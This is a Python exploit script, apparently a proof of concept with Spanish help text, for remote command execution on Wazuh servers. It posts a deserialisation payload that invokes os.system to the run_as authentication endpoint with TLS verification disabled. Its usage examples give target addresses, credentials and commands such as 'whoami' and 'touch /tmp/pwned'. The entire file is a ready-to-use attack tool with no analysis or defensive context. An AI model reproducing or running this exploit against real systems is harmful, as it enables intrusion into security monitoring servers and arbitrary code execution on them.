import requests
from requests.auth import HTTPBasicAuth
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_help():
    help_text = """
Uso:
  python3 exploit_wazuh.py <worker-server[:port]> <username:password> "<comando>"

Ejemplos:
  python3 exploit_wazuh.py 192.168.1.18 wazuh-wui:MyS3cr37P450r.*- "whoami"
  python3 exploit_wazuh.py 192.168.1.18:58000 admin:admin123 "id"
  python3 exploit_wazuh.py wazuh.misitio.com wazuh-wui:password "touch /tmp/pwned"
"""
    print(help_text)

def parse_server_input(server_input):
    if ':' in server_input:
        host, port = server_input.split(':')
    else:
        host = server_input
        port = '55000'
    return host, port

def parse_credentials(cred_string):
    if ':' not in cred_string:
        print("[!] Formato incorrecto de credenciales. Usa: username:password")
        sys.exit(1)
    return cred_string.split(':', 1)

def exploit_wazuh_worker(server_input, username, password, command):
    host, port = parse_server_input(server_input)
    url = f"https://{host}:{port}/security/user/authenticate/run_as"

    payload = {
        "__unhandled_exc__": {
            "__class__": "os.system",
            "__args__": [command]
        }
    }

    try:
        response = requests.post(
            url,
            auth=HTTPBasicAuth(username, password),
            headers={"Content-Type": "application/json"},
            json=payload,
            verify=False
        )
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error en la conexi√≥n: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4 or sys.argv[1] in ['-h', '--help']:
        print_help()
        sys.exit(0)

    server_input = sys.argv[1]
    username, password = parse_credentials(sys.argv[2])
    command = sys.argv[3]

    exploit_wazuh_worker(server_input, username, password, command)
